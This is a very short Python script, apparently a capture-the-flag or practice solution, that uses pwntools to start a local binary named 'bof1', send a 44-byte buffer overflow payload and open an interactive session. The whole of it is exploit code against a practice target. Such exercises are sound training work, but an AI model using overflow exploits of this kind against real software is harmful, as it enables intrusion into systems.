from pwn import *

r = process("./bof1")

payload = b'a'*44
r.sendline(payload)
r.interactive()